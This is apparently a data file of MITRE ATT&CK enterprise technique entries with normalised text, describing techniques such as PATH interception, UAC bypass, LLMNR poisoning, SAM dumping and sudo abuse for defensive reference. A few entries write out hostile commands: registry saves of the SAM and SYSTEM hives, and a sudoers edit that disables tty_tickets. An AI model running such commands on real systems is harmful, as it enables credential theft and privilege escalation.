attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32,['enterprise-attack'],['T1574.007'],Path Interception by PATH Environment Variable,adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries  adversaries may place a program in an earlier entry in the list of directories stored in the path environment variable  which windows will then execute when it searches sequentially through that path listing in search of the binary that was called from a script or the command line_  the path environment variable contains a list of directories  certain methods of executing a program  namely using cmd_exe or the command line  rely solely on the path environment variable to determine the locations that are searched for a program when the path for the program is not given  if any directories are listed in the path environment variable before the windows directory   systemroot  system    e_g_  c  windows system     a program may be placed in the preceding directory that is named the same as a windows program  such as cmd  powershell  or python   which will be executed when that command is executed from a script or command line_  for example  if c  example path precedes c  windows system   is in the path environment variable  a program that is named net_exe and placed in c  example path will be called instead of the windows system  net  when  net  is executed from the command line 
attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a,['enterprise-attack'],['T1213.002'],Sharepoint,adversaries may leverage the sharepoint repository as a source to mine valuable information  sharepoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems  for example  the following is a list of example information that may hold potential value to an adversary and may also be found on sharepoint     policies  procedures  and standards   physical   logical network diagrams   system architecture diagrams   technical system documentation   testing   development credentials   work   project schedules   source code snippets   links to network shares and other internal resources
attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5,['enterprise-attack'],['T1006'],Direct Volume Access,adversaries may directly access a volume to bypass file access controls and file system monitoring  windows allows programs to have direct access to logical volumes  programs with direct access may read and write files directly from the drive by analyzing file system data structures  this technique bypasses windows file access controls as well as file system monitoring tools   citation  hakobyan        utilities  such as ninjacopy  exist to perform these actions in powershell   citation  github powersploit ninjacopy 
attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a,['enterprise-attack'],['T1044'],File System Permissions Weakness,processes may automatically execute specific binaries as part of their functionality or to perform other actions  if the permissions on the file system directory containing a target binary  or permissions on the binary itself  are improperly set  then the target binary may be overwritten with another binary using user level permissions and executed by the original process  if the original process and thread are running under a higher permissions level  then the replaced binary will also execute under higher level permissions  which could include system_  adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level  if the executing process is set to run at a specific time or during a certain event  e_g_  system bootup  then this technique can also be used for persistence_      services  manipulation of windows service binaries is one variation of this technique  adversaries may replace a legitimate service executable with their own executable to gain persistence and or privilege escalation to the account context the service is set to execute under  local domain account  system  localservice  or networkservice   once the service is started  either directly by the user  if appropriate access is available  or through some other means  such as a system restart if the service starts on bootup  the replaced executable will run instead of the original service executable_      executable installers  another variation of this technique can be performed by taking advantage of a weakness that is common in executable  self extracting installers  during the installation process  it is common for installers to use a subdirectory within the  temp  directory to unpack binaries such as dlls  exes  or other payloads  when installers create subdirectories and files they often do not set appropriate permissions to restrict write access  which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process  this behavior is related to and may take advantage of  dll search order  some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code  this behavior is related to  bypass user account  several examples of this weakness in existing common installers have been reported to software vendors   citation  mozilla firefox installer dll hijack   citation  seclists kanthak  zip installer 
attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff,['enterprise-attack'],['T1564.008'],Email Hiding Rules,adversaries may use email rules to hide inbound emails in a compromised user's mailbox  many email clients allow users to create inbox rules for various email functions  including moving emails to other folders  marking emails as read  or deleting emails  rules may be created or modified within email clients or through external features such as the new inboxrule or set inboxrule  cmdlets on windows systems_ citation  microsoft inbox rules  citation  macos email rules  citation  microsoft new inboxrule  citation  microsoft set inboxrule   adversaries may utilize email rules within a compromised user's mailbox to delete and or move emails to less noticeable folders  adversaries may do this to hide security alerts  c  communication  or responses to  internal  emails sent from the compromised account_  any user or administrator within the organization  or adversary with valid credentials  may be able to create rules to automatically move or delete emails  these rules can be abused to impair delay detection had the email content been immediately seen by a user or defender  malicious rules commonly filter out emails based on key words  such as malware  suspicious  phish  and hack  found in message bodies and subject lines   citation  microsoft cloud app security 
attack-pattern--0cfe31a7-81fc-472c-bc45-e2808d1066a3,['enterprise-attack'],['T1491.002'],External Defacement,an adversary may deface systems external to an organization in an attempt to deliver messaging  intimidate  or otherwise mislead an organization or users   external  may ultimately cause users to distrust the systems and to question discredit the system s integrity  externally facing websites are a common victim of defacement  often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda_ citation  fireeye cyber threats to media industries  citation  kevin mandia statement to us senate committee on intelligence  citation  anonymous hackers deface russian govt site   external  may be used as a catalyst to trigger events  or as a response to actions taken by an organization or government  similarly  website defacement may also be used as setup  or a precursor  for future attacks such as  drive by  trend micro deep dive into defacement 
attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0,['enterprise-attack'],['T1171'],LLMNR/NBT-NS Poisoning and Relay,link local multicast name resolution  llmnr  and netbios name service  nbt ns  are microsoft windows components that serve as alternate methods of host identification  llmnr is based upon the domain name system  dns  format and allows hosts on the same local link to perform name resolution for other hosts  nbt ns identifies systems on a local network by their netbios name   citation  wikipedia llmnr   citation  technet netbios   adversaries can spoof an authoritative source for name resolution on a victim network by responding to llmnr  udp       nbt ns  udp      traffic as if they know the identity of the requested host  effectively poisoning the service so that the victims will communicate with the adversary controlled system  if the requested host belongs to a resource that requires identification authentication  the username and ntlmv  hash will then be sent to the adversary controlled system  the adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through  network  and crack the hashes offline through  brute  to obtain the plaintext passwords  in some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system  the ntlmv  hashes can be intercepted and relayed to access and execute code against a target system  the relay step can happen in conjunction with poisoning but may also be independent of it   citation  byt bl  d r ntlm relaying  citation  secure ideas smb relay   several tools exist that can be used to poison name services within local networks such as nbnspoof  metasploit  and   citation  github nbnspoof   citation  rapid  llmnr spoofer   citation  github responder 
attack-pattern--0dda99f0-4701-48ca-9774-8504922e92d3,['enterprise-attack'],['T1590.005'],IP Addresses,adversaries may gather the victim's ip addresses that can be used during targeting  public ip addresses may be allocated to organizations by block  or a range of sequential addresses  information about assigned ip addresses may include a variety of details  such as which ip addresses are in use  ip addresses may also enable an adversary to derive other details about a victim  such as organizational size  physical location s   internet service provider  and or where how their publicly facing infrastructure is hosted_  adversaries may gather this information in various ways  such as direct collection actions via  active  or  phishing for  information about assigned ip addresses may also be exposed to adversaries via online or other accessible data sets  ex   search open technical  dns dumpster  citation  circl passive dns  gathering this information may reveal opportunities for other forms of reconnaissance  ex   active  or  search open  establishing operational resources  ex   acquire  or  compromise  and or initial access  ex   external remote
attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7,['enterprise-attack'],['T1499.001'],OS Exhaustion Flood,adversaries may launch a denial of service  dos  attack targeting an endpoint's operating system  os   a system's os is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity  these attacks do not need to exhaust the actual resources on a system  the attacks may simply exhaust the limits and available resources that an os self imposes_  different ways to achieve this exist  including tcp state exhaustion attacks such as syn floods and ack floods_ citation  arbor annualdosreport jan       with syn floods  excessive amounts of syn packets are sent  but the   way tcp handshake is never completed  because each os has a maximum number of concurrent tcp connections that it will allow  this can quickly exhaust the ability of the system to receive new requests for tcp connections  thus preventing access to any tcp service provided by the server_ citation  cloudflare synflood   ack floods leverage the stateful nature of the tcp protocol  a flood of ack packets are sent to the target  this forces the os to search its state table for a related tcp connection that has already been established  because the ack packets are for connections that do not exist  the os will have to search the entire state table to confirm that no match exists  when it is necessary to do this for a large flood of packets  the computational requirements can cause the server to become sluggish and or unresponsive  due to the work it must do to eliminate the rogue ack packets  this greatly reduces the resources available for providing the targeted service_ citation  corero syn ackflood 
attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b,['enterprise-attack'],['T1014'],Rootkit,adversaries may use rootkits to hide the presence of programs  files  network connections  services  drivers  and other system components  rootkits are programs that hide the existence of malware by intercepting hooking and modifying operating system api calls that supply system information   citation  symantec windows rootkits    rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower  to include a hypervisor  master boot record  or  system   citation  wikipedia rootkit  rootkits have been seen for windows  linux  and mac os x systems   citation  crowdstrike linux rootkit   citation  blackhat mac osx rootkit 
attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3,['enterprise-attack'],['T1546.013'],PowerShell Profile,adversaries may gain persistence and elevate privileges by executing malicious content triggered by powershell profiles  a powershell profile   profile_ps   is a script that runs when  starts and can be used as a logon script to customize user environments_   supports several profiles depending on the user or host program  for example  there can be different profiles for  host programs such as the powershell console  powershell ise or visual studio code  an administrator can also configure a profile that applies to all users and host programs on the local computer   citation  microsoft about profiles    adversaries may modify these profiles to include arbitrary commands  functions  modules  and or  drives to gain persistence  every time a user opens a  session the modified script will be executed unless the  noprofile flag is used when it is launched   citation  eset turla powershell may         an adversary may also be able to escalate privileges if a script in a powershell profile is loaded and executed by an account with higher privileges  such as a domain administrator   citation  wits end and shady powershell profiles 
attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d,['enterprise-attack'],['T1059.007'],JavaScript,adversaries may abuse various implementations of javascript for execution  javascript  js  is a platform independent scripting language  compiled just in time at runtime  commonly associated with scripts in webpages  though js can be executed in runtime environments outside the browser_  jscript is the microsoft implementation of the same scripting standard  jscript is interpreted via the windows script engine and thus integrated with many components of windows such as the  component object  and internet explorer html application  hta  pages_ citation  jscrip may       citation  microsoft jscript       citation  microsoft windows scripts   javascript for automation  jxa  is a macos scripting language based on javascript  included as part of apple s open scripting architecture  osa   that was introduced in osx   _    apple s osa provides scripting capabilities to control applications  interface with the operating system  and bridge access into the rest of apple s internal apis  as of osx   _    osa only supports two languages  jxa and  scripts can be executed via the command line utility osascript  they can be compiled into applications or script files via osacompile  and they can be compiled and executed in memory of other programs by leveraging the osakit framework_ citation  apple about mac scripting       citation  specterops jxa       citation  sentinelone macos red team  citation  red canary silver sparrow feb      citation  mdsec macos jxa and vscode   adversaries may abuse various implementations of javascript to execute various behaviors  common uses include hosting malicious scripts on websites as part of a  drive by  or downloading and executing these script files as secondary payloads  since these payloads are text based  it is also very common for adversaries to obfuscate their content as part of  obfuscated files or
attack-pattern--0ff59227-8aa8-4c09-bf1f-925605bd07ea,['enterprise-attack'],['T1590.002'],DNS,adversaries may gather information about the victim's dns that can be used during targeting  dns information may include a variety of details  including registered name servers as well as records that outline addressing for a target s subdomains  mail servers  and other hosts  dns  mx  txt  and spf records may also reveal the use of third party cloud and saas providers  such as office      g suite  salesforce  or zendesk_ citation  sean metcalf twitter dns records   adversaries may gather this information in various ways  such as querying or otherwise collecting details via  dns passive  dns information may also be exposed to adversaries via online or other accessible data sets  ex   search open technical  dns dumpster  citation  circl passive dns  gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open technical   search open  or  active  establishing operational resources  ex   acquire  or  compromise  and or initial access  ex   external remote
attack-pattern--0fff2797-19cb-41ea-a5f1-8a9303b8158e,['enterprise-attack'],['T1501'],Systemd Service,systemd services can be used to establish persistence on a linux system  the systemd service manager is commonly used for managing background daemon processes  also known as services  and other system resources_ citation  linux man pages  systemd january       citation  freedesktop_org linux systemd   sep      systemd is the default initialization  init  system on many linux distributions starting with debian    ubuntu   _    centos    rhel    fedora     and replaces legacy init systems including sysvinit and upstart while remaining backwards compatible with the aforementioned init systems_  systemd utilizes configuration files known as service units to control how services boot and under what conditions  by default  these unit files are stored in the  etc systemd system and  usr lib systemd system directories and have the file extension _service  each service unit file may contain numerous directives that can execute system commands      execstart  execstartpre  and execstartpost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start     execreload directive covers when a service restarts     execstop and execstoppost directives cover when a service is stopped or manually by 'systemctl'_  adversaries have used systemd functionality to establish persistent access to victim systems by creating and or modifying service unit files that cause systemd to execute malicious commands at recurring intervals  such as at system boot_ citation  anomali rocke march       citation  gist arch package compromise   jul      citation  arch linux package systemd compromise bleepingcomputer   jul      citation  acroread package compromised arch linux mail  jul       while adversaries typically require root privileges to create modify service unit files in the  etc systemd system and  usr lib systemd system directories  low privilege users can create modify service unit files in directories such as   _config systemd user  to achieve user level persistence_ citation  rapid  service persistence   june     
attack-pattern--101c3a64-9ba5-46c9-b573-5c501053cbca,['enterprise-attack'],['T1514'],Elevated Execution with Prompt,adversaries may leverage the authorizationexecutewithprivileges api to escalate privileges by prompting the user for credentials_ citation  appledocs authorizationexecutewithprivileges  the purpose of this api is to give application developers an easy way to perform operations with root privileges  such as for application installation or updating   this api does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified  although this api is deprecated  it still fully functions in the latest releases of macos  when calling this api  the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made  the program calling the api may also load world writable files which can be modified to perform malicious behavior with elevated privileges_  adversaries may abuse authorizationexecutewithprivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms_ citation  death by      installers  it's all broken   citation  carbon black shlayer feb       citation  osx coldroot rat  this technique may be combined with  to trick the user into granting escalated privileges to malicious code_ citation  death by      installers  it's all broken   citation  carbon black shlayer feb       this technique has also been shown to work by modifying legitimate programs present on the machine that make use of this api_ citation  death by      installers  it's all broken  
attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967,['enterprise-attack'],['T1123'],Audio Capture,an adversary can leverage a computer's peripheral devices  e_g_  microphones and webcams  or applications  e_g_  voice and video call services  to capture audio recordings for the purpose of listening into sensitive conversations to gather information_  malware or scripts may be used to interact with the devices through an available api provided by the operating system or an application to capture audio  audio files may be written to disk and exfiltrated later 
attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5,['enterprise-attack'],['T1543'],Create or Modify System Process,adversaries may create or modify system level processes to repeatedly execute malicious payloads as part of persistence  when operating systems boot up  they can start processes that perform background system functions  on windows and linux  these system processes are referred to as services_ citation  technet services  on macos  launchd processes known as  launch  and  launch  are run to finish system initialization and load user specific parameters_ citation  appledocs launch agent daemons    adversaries may install new services  daemons  or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence  similarly  adversaries may modify existing services  daemons  or agents to achieve the same effect     services  daemons  or agents may be created with administrator privileges but executed under root system privileges  adversaries may leverage this functionality to create or modify system processes in order to escalate privileges_ citation  osx malware detection 
attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d,['enterprise-attack'],['T1133'],External Remote Services,adversaries may leverage external facing remote services to initially access and or persist within a network  remote services such as vpns  citrix  and other access mechanisms allow users to connect to internal enterprise network resources from external locations  there are often remote service gateways that manage connections and credential authentication for these services  services such as  windows remote  and  can also be used externally_ citation  macos vnc software for remote desktop   access to  valid  to use the service is often a requirement  which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network_ citation  volexity virtual private keylogging  access to remote services may be used as a redundant or persistent access mechanism during an operation_  access may also be gained through an exposed service that doesn t require authentication  in containerized environments  this may include an exposed docker api  kubernetes api server  kubelet  or web application such as the kubernetes dashboard_ citation  trend micro exposed docker server  citation  unit    hildegard malware 
attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44,['enterprise-attack'],['T1109'],Component Firmware,some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or bios  this technique may be similar to  system  but conducted upon other system components that may not have the same capability or level of integrity checking  malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re images  as well as a way to evade host software based defenses and integrity checks 
attack-pattern--10ff21b9-5a01-4268-a1b5-3b55015f1847,['enterprise-attack'],['T1546.006'],LC_LOAD_DYLIB Addition,adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries  mach o binaries have a series of headers that are used to perform certain operations when a binary is loaded  the lc_load_dylib header in a mach o binary tells macos and os x which dynamic libraries  dylibs  to load during execution time  these can be added ad hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies_ citation  writing bad malware for osx  there are tools available to perform these changes_  adversaries may modify mach o binary headers to load and execute malicious dylibs every time the binary is executed  although any changes will invalidate digital signatures on binaries because the binary is being modified  this can be remediated by simply removing the lc_code_signature command from the binary so that the signature isn t checked at load time_ citation  malware persistence on os x 
attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff,['enterprise-attack'],['T1539'],Steal Web Session Cookie,an adversary may steal web application or service session cookies and use them to gain access to web applications or internet services as an authenticated user without needing credentials  web applications and services often use session cookies as an authentication token after a user has authenticated to a website_  cookies are often valid for an extended period of time  even if the web application is not actively used  cookies can be found on disk  in the process memory of the browser  and in network traffic to remote systems  additionally  other applications on the targets machine might store sensitive authentication cookies in memory  e_g  apps which authenticate to cloud services   session cookies can be used to bypasses some multi factor authentication protocols_ citation  pass the cookie   there are several examples of malware targeting cookies from web browsers on the local system_ citation  kaspersky tajmahal april       citation  unit    mac crypto cookies january       there are also open source frameworks such as evilginx   and muraena that can gather session cookies through a malicious proxy  ex   that can be set up by an adversary and used in phishing campaigns_ citation  github evilginx   citation  github mauraena   after an adversary acquires a valid cookie  they can then perform a  web session  technique to login to the corresponding web application 
attack-pattern--1126cab1-c700-412f-a510-61f4937bb096,['enterprise-attack'],['T1053.007'],Container Orchestration Job,adversaries may abuse task scheduling functionality provided by container orchestration tools such as kubernetes to schedule deployment of containers configured to execute malicious code  container orchestration jobs run these automated tasks at a specific date and time  similar to cron jobs on a linux system  deployments of this type can also be configured to maintain a quantity of containers over time  automating the process of maintaining persistence within a cluster_  in kubernetes  a cronjob may be used to schedule a job that runs one or more containers to perform specific tasks_ citation  kubernetes jobs  citation  kubernetes cronjob  an adversary therefore may utilize a cronjob to schedule deployment of a job that executes malicious code in various nodes within a cluster_ citation  threat matrix for kubernetes 
attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd,['enterprise-attack'],['T1568.002'],Domain Generation Algorithms,adversaries may make use of domain generation algorithms  dgas  to dynamically identify a destination domain for command and control traffic rather than relying on a list of static ip addresses or domains  this has the advantage of making it much harder for defenders to block  track  or take over the command and control channel  as there potentially could be thousands of domains that malware can check for instructions_ citation  cybereason dissecting dgas  citation  cisco umbrella dga  citation  unit    dga feb        dgas can take the form of apparently random or  gibberish  strings  ex  istgmxdejdnxuyla_ru  when they construct domain names by generating each letter  alternatively  some dgas employ whole words as the unit by concatenating words together instead of letters  ex  cityjulydish_net   many dgas are time based  generating a different domain for each time period  hourly  daily  monthly  etc   others incorporate a seed value as well to make predicting future domains more difficult for defenders_ citation  cybereason dissecting dgas  citation  cisco umbrella dga  citation  talos ccleanup       citation  akamai dga mitigation   adversaries may use dgas for the purpose of  fallback  when contact is lost with the primary command and control server malware may employ a dga as a means to reestablishing command and control_ citation  talos ccleanup       citation  fireeye poshspy april       citation  eset sednit      activity 
attack-pattern--11f29a39-0942-4d62-92b6-fe236cf3066e,['enterprise-attack'],['T1036.007'],Double File Extension,adversaries may abuse a double extension in the filename as a means of masquerading the true file type  a file name may include a secondary file type extension that may cause only the first extension to be displayed  ex  file_txt_exe may render in some views as just file_txt   however  the second extension is the true file type that determines how the file is opened and executed  the real file extension may be hidden by the operating system in the file browser  ex  explorer_exe   as well as in any software configured using or similar to the system s policies_ citation  pcmag doubleextension  citation  socprime doubleextension    adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads  a very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code  such files often pose as email attachments and allow an adversary to gain  initial  into a user s system via  spearphishing  then  user  for example  an executable file attachment named evil_txt_exe may display as evil_txt to a user  the user may then view it as a benign text file and open it  inadvertently executing the hidden malware_ citation  socprime doubleextension   common file types  such as text files  _txt  _doc  etc_  and image files  _jpg  _gif  etc_  are typically used as the first extension to appear benign  executable extensions commonly regarded as dangerous  such as _exe  _lnk  _hta  and _scr  often appear as the second extension and true file type 
attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073,['enterprise-attack'],['T1548.002'],Bypass User Account Control,adversaries may bypass uac mechanisms to elevate process privileges on system  windows user account control  uac  allows a program to elevate its privileges  tracked as integrity levels ranging from low to high  to perform a task under administrator level permissions  possibly by prompting the user for confirmation  the impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action_ citation  technet how uac works   if the uac protection level of a computer is set to anything but the highest level  certain windows programs can elevate privileges or execute some elevated  component object  objects without prompting the user through the uac notification box_ citation  technet inside uac  citation  msdn com elevation  an example of this is use of  to load a specifically crafted dll which loads an auto elevated  component object  object and performs a file operation in a protected directory which would typically require elevated access  malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user_ citation  davidson windows   many methods have been discovered to bypass uac  the github readme page for uacme contains an extensive list of methods citation  github uacme  that have been discovered and implemented  but may not be a comprehensive list of bypasses  additional bypass methods are regularly discovered and some used in the wild  such as     eventvwr_exe can auto elevate and execute a specified binary or script_ citation  enigma x  fileless uac bypass  citation  fortinet fareit   another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known  since uac is a single system security mechanism  and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity_ citation  sans uac bypass 
attack-pattern--128c55d3-aeba-469f-bd3e-c8996ab4112a,['enterprise-attack'],['T1099'],Timestomp,adversaries may take actions to hide the deployment of new  or modification of existing files to obfuscate their activities  timestomping is a technique that modifies the timestamps of a file  the modify  access  create  and change times   often to mimic files that are in the same folder  this is done  for example  on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools  timestomping may be used along with file name  to hide malware and tools   citation  windowsir anti forensic techniques 
attack-pattern--132d5b37-aac5-4378-a8dc-3127b18a73dc,['enterprise-attack'],['T1016.001'],Internet Connection Discovery,adversaries may check for internet connectivity on compromised systems  this may be performed during automated discovery and can be accomplished in numerous ways such as using  tracert  and get requests to websites_  adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their c  servers before attempting to connect to them  the results may also be used to identify routes  redirectors  and proxy servers 
attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0,['enterprise-attack'],['T1548.003'],Sudo and Sudo Caching,adversaries may perform sudo caching and or use the sudoers file to elevate privileges  adversaries may do this to execute commands as other users or spawn processes with higher privileges_  within linux and macos systems  sudo  sometimes referred to as  superuser do   allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system  the sudo command  allows a system administrator to delegate authority to give certain users  or groups of users  the ability to run some  or all  commands as root or another user while providing an audit trail of the commands and their arguments   citation  sudo man page       since sudo was made for the system administrator  it has some useful configuration features such as a timestamp_timeout  which is the amount of time in minutes between instances of sudo before it will re prompt for a password  this is because sudo has the ability to cache credentials for a period of time  sudo creates  or touches  a file at  var db sudo with a timestamp of when sudo was last run to determine this timeout  additionally  there is a tty_tickets variable that treats each new tty  terminal session  in isolation  this means that  for example  the sudo timeout of one tty will not affect another tty  you will have to type the password again _  the sudoers file   etc sudoers  describes which users can run which commands and from which terminals  this also describes which commands users can run as other users or groups  this provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed  typically by prompting for a password  however  the sudoers file can also specify when to not prompt users for passwords with a line like user  all  all  nopasswd  all_ citation  osx_dok malware  elevated privileges are required to edit this file though_  adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password  for example   var db sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range  if it does  then malware can execute sudo commands without needing to supply the user's password  additional  if tty_tickets is disabled  adversaries can do this from any tty for that user_  in the wild  malware has disabled tty_tickets to potentially make scripting easier by issuing echo  'defaults  tty_tickets '     etc sudoers_ citation  cybereason osx proton  in order for this change to be reflected  the malware also issued killall terminal  as of macos sierra  the sudoers file has tty_tickets enabled by default 
attack-pattern--143c0cbb-a297-4142-9624-87ffc778980b,['enterprise-attack'],['T1560.003'],Archive via Custom Method,an adversary may compress or encrypt data that is collected prior to exfiltration using a custom method  adversaries may choose to use custom archival methods  such as encryption with xor or stream ciphers implemented with no external library or utility references  custom implementations of well known compression algorithms have also been used_ citation  eset sednit part   
attack-pattern--144e007b-e638-431d-a894-45d90c54ab90,['enterprise-attack'],['T1578'],Modify Cloud Compute Infrastructure,an adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses  a modification to the compute service infrastructure can include the creation  deletion  or modification of one or more components such as compute instances  virtual machines  and snapshots_  permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure  modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence_ citation  mandiant m trends      
attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce,['enterprise-attack'],['T1069'],Permission Groups Discovery,adversaries may attempt to find group and permission settings  this information can help adversaries determine which user accounts and groups are available  the membership of users in particular groups  and which users and groups have elevated permissions 
attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f,['enterprise-attack'],['T1114'],Email Collection,adversaries may target user email to collect sensitive information  emails may contain sensitive data  including trade secrets or personal information  that can prove valuable to adversaries  adversaries can collect or forward email from mail servers or clients 
attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011,['enterprise-attack'],['T1003.002'],Security Account Manager,adversaries may attempt to extract credential material from the security account manager  sam  database either through in memory techniques or through the windows registry where the sam database is stored  the sam is a database file that contains local accounts for the host  typically those found with the net user command  enumerating the sam database requires system level access_  a number of tools can be used to retrieve the sam file through in memory techniques     pwdumpx_exe         secretsdump_py  alternatively  the sam can be extracted from the registry with reg     reg save hklm sam sam   reg save hklm system system  creddump  can then be used to process the sam database locally to retrieve hashes_ citation  github creddump    notes      rid     account is the local  built in administrator_   rid     is the guest account_   user accounts start with a rid of       _
attack-pattern--166de1c6-2814-4fe5-8438-4e80f76b169f,['enterprise-attack'],['T1596.002'],WHOIS,adversaries may search public whois data for information about victims that can be used during targeting  whois data is stored by regional internet registries  rir  responsible for allocating and assigning internet resources such as domain names  anyone can query whois servers for information about a registered domain  such as assigned ip blocks  contact information  and dns nameservers_  adversaries may search whois data to gather actionable information  threat actors can use online resources or command line utilities to pillage through whois data for information about potential victims  information from these sources may reveal opportunities for other forms of reconnaissance  ex   active  or  phishing for  establishing operational resources  ex   acquire  or  compromise  and or initial access  ex   external remote  or  trusted
attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada,['enterprise-attack'],['T1542.001'],System Firmware,adversaries may modify system firmware to persist on systems_the bios  basic input output system  and the unified extensible firmware interface  uefi  or extensible firmware interface  efi  are examples of system firmware that operate as the software interface between the operating system and hardware of a computer   citation  wikipedia bios   citation  wikipedia uefi   citation  about uefi   system firmware like bios and  u efi underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity  capabilities exist to overwrite the system firmware  which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect 
attack-pattern--16cdd21f-da65-4e4f-bc04-dd7d198c7b26,['enterprise-attack'],['T1594'],Search Victim-Owned Websites,adversaries may search websites owned by the victim for information that can be used during targeting  victim owned websites may contain a variety of details  including names of departments divisions  physical locations  and data about key employees such as names  roles  and contact info  ex   email  these sites may also have details highlighting business operations and relationships_ citation  comparitech leak   adversaries may search victim owned websites to gather actionable information  information from these sources may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open technical  establishing operational resources  ex   establish  or  compromise  and or initial access  ex   trusted  or
attack-pattern--16e94db9-b5b1-4cd0-b851-f38fbd0a70f2,['enterprise-attack'],['T1069.003'],Cloud Groups,adversaries may attempt to find cloud groups and permission settings  the knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment  as well as which users are associated with a particular group_  with authenticated access there are several tools that can be used to find permissions groups  the get msolrole powershell cmdlet can be used to obtain roles and permissions groups for exchange and office     accounts  citation  microsoft msolrole  citation  github raindance _  azure cli  az cli  and the google cloud identity provider api also provide interfaces to obtain permissions groups  the command az ad user get member groups will list groups associated to a user account for azure while the api endpoint get https   cloudidentity_googleapis_com v  groups lists group resources available to a user for google_ citation  microsoft az cli  citation  black hills red teaming ms ad azure        citation  google cloud identity api documentation   adversaries may attempt to list acls for objects to determine the owner and other accounts with access to the object  for example  via the aws getbucketacl api  citation  aws get bucket acl   using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object 
attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c,['enterprise-attack'],['T1574.011'],Services Registry Permissions Weakness,adversaries may execute their own malicious payloads by hijacking the registry entries used by services  adversaries may use flaws in the permissions for registry keys related to services to redirect from the originally specified executable to one that they control  in order to launch their own code when a service starts  windows stores local service configuration information in the registry under hklm system currentcontrolset services  the information stored under a service's registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller  sc_exe    or  access to registry keys is controlled through access control lists and user permissions   citation  registry key security   if the permissions for users and groups are not properly set and allow access to the registry keys for a service  adversaries may change the service's binpath imagepath to point to a different executable under their control  when the service starts or is restarted  then the adversary controlled program will execute  allowing the adversary to establish persistence and or privilege escalation to the account context the service is set to execute under  local domain account  system  localservice  or networkservice _  adversaries may also alter other registry keys in the service s registry tree  for example  the failurecommand key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted_ citation  kansa service related collectors  citation  tweet registry perms weakness   the performance key contains the name of a driver service's performance dll and the names of several exported functions in the dll  if the performance key is not already present and if an adversary controlled user has the create subkey permission  adversaries may create the performance key in the service s registry tree to point to a malicious dll_  adversaries may also add the parameters key  which stores driver specific data  or other custom subkeys for their malicious services to establish persistence or enable other malicious activities  additionally  if adversaries launch their malicious services using svchost_exe  the service s file may be identified using hkey_local_machine system currentcontrolset services servicename parameters servicedll 
